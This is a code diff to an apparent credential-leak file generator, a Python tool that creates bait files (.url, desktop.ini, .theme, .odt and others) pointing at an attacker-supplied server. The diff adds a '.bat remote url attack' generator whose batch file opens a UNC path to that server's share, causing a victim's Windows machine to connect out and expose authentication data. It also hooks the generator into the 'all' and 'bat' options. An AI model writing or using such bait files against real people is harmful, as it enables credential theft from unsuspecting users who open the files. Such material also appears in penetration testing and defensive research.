@@ -70,6 +70,7 @@ def build_parser():
             "libraryms",
             "autoruninf",
             "desktopini",
+            "bat",
             "odt")),
         help='Choose to generate all files or a specific filetype')
     parser.add_argument('-s', '--server',action='store', dest='server',required=True,
@@ -102,6 +103,16 @@ def create_url_url(generate,server,filename):
 URL=file://''' + server + '''/leak/leak.html''')
 	file.close()
 	print("Created: " + filename + " (BROWSE TO FOLDER)")
+
+
+## .bat remote url attack
+def create_bat(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(
+            f'@echo off\n'
+            f'start "" "\\\\{server}\\share"\n'
+        )
+    print("Created: " + filename + " (BROWSE TO FOLDER)")
 
 
 # .url remote IconFile attack
@@ -611,6 +622,8 @@ def main():
 
         create_theme(args.generate, args.server, os.path.join(args.filename, base_filename + ".theme"))
 
+        create_bat(args.generate, args.server, os.path.join(args.filename, base_filename + ".bat"))
+
         create_odt(args.server, os.path.join(args.filename, base_filename + ".odt"))
 
     elif(args.generate == "scf"):
@@ -673,6 +686,9 @@ def main():
 
     elif(args.generate == "theme"):
         create_theme(args.generate, args.server, os.path.join(args.filename, base_filename + ".theme"))
+
+    elif(args.generate == "bat"):
+        create_bat(args.generate, args.server, os.path.join(args.filename, base_filename + ".bat"))
 
     elif(args.generate == "odt"):
         create_odt(args.server, os.path.join(args.filename, base_filename + ".odt"))
